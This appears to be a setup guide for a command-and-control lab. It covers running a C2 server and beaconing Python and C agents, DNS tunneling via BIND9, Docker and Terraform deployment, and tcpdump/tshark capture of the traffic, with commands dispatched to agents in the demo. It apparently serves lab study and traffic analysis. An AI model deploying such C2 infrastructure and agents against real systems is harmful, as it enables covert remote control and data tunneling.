# Setup Guide

## System Requirements

- Ubuntu 22.04+ (or equivalent Debian-based)
- Python 3.9+
- GCC 9+
- libcurl development headers
- OpenSSL development headers
- BIND9 utilities (for DNS tunnel testing)

## Install System Dependencies

```bash
sudo apt-get update
sudo apt-get install -y gcc libcurl4-openssl-dev libssl-dev bind9-utils docker.io docker-compose
```

## Python Environment Setup

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

## Compile the C Agent

```bash
cd src/modules/agent_handler
make clean
make
```

The compiled binary will be at `src/modules/agent_handler/agent`.

## Run the C2 Server

```bash
source .venv/bin/activate
python src/core/c2_server.py --host 0.0.0.0 --port 8080 --secret-key mysecretkey1234567890
```

The server starts on the specified host and port. Agent beacons are accepted at `/api/v1/beacon`.

## Configure DNS Tunneling

### Local BIND9 Setup

Edit your DNS server configuration to delegate a subdomain to the C2 DNS tunnel server:

```
; named.conf.local
zone "c2.example.com" IN {
    type master;
    file "/etc/bind/zones/c2.example.com.db";
    allow-query { any; };
};
```

### Zone File

```
; /etc/bind/zones/c2.example.com.db
$TTL 60
@   IN  SOA ns1.c2.example.com. admin.c2.example.com. (
        2024010101 ; Serial
        3600       ; Refresh
        1800       ; Retry
        604800     ; Expire
        86400 )    ; Minimum TTL

@   IN  NS  ns1.c2.example.com.
ns1 IN  A   127.0.0.1
```

Restart BIND9:
```bash
sudo systemctl restart bind9
```

### DNS Tunnel Server

```bash
python src/core/dns_tunnel.py --mode server --domain c2.example.com --port 10053
```

### DNS Tunnel Client

```bash
python src/core/dns_tunnel.py --mode client --domain c2.example.com --dns-server 127.0.0.1 --port 10053
```

## Run the Python Agent

```bash
python src/core/c2_agent.py \
    --server-url http://localhost:8080 \
    --secret-key mysecretkey1234567890 \
    --beacon-interval 60 \
    --jitter 0.3
```

## Run the C Agent

```bash
export C2_SERVER_URL="http://localhost:8080"
export C2_SECRET_KEY="mysecretkey1234567890"
./src/modules/agent_handler/agent
```

## Docker Lab Environment

Start the complete lab:
```bash
cd lab
docker compose up -d
```

Verify containers:
```bash
docker compose ps
```

View DNS server logs:
```bash
docker compose logs dns-server
```

Stop the lab:
```bash
docker compose down -v
```

## Packet Capture Instructions

### Capture DNS Tunnel Traffic

On the DNS server interface:
```bash
sudo tcpdump -i lo -n port 53 -w dns_tunnel_capture.pcap
```

Filter for TXT record responses only:
```bash
sudo tcpdump -i lo -n port 53 and "udp[10] & 0x80 = 0" -A -w dns_responses.pcap
```

### Capture HTTPS C2 Traffic

Capture all traffic to/from C2 server:
```bash
sudo tcpdump -i any -n host localhost and port 8080 -A -s 0 -w c2_http_traffic.pcap
```

Capture TCP stream for analysis:
```bash
sudo tcpdump -i any -n port 8080 -w c2_raw.pcap
```

### Analyze Captures with tcpdump

Read DNS queries:
```bash
tcpdump -r dns_tunnel_capture.pcap -n port 53
```

Read HTTPS payloads:
```bash
tcpdump -r c2_http_traffic.pcap -A -s 0
```

### Analyze with tshark

DNS tunnel extraction:
```bash
tshark -r dns_tunnel_capture.pcap -Y "dns.qry.name contains c2.example.com" -T fields -e dns.qry.name
```

HTTP POST extraction:
```bash
tshark -r c2_http_traffic.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

## Terraform Cloud Deployment

```bash
cd lab/terraform
terraform init
terraform plan -var="aws_region=us-east-1"
terraform apply -var="aws_region=us-east-1"
```

## Full Demo Walkthrough

1. Start the lab: `cd lab && docker compose up -d`
2. Start packet capture: `sudo tcpdump -i lo -n port 53 -w demo.pcap &`
3. Verify C2 server is running: `curl http://localhost:8080/api/v1/beacon -X POST -d "test"`
4. Launch an agent in another terminal
5. Watch beacons arrive at the server
6. Dispatch a command via the server console
7. Observe command execution and result return
8. Stop capture: `kill %1`
9. Analyze: `tshark -r demo.pcap -n`
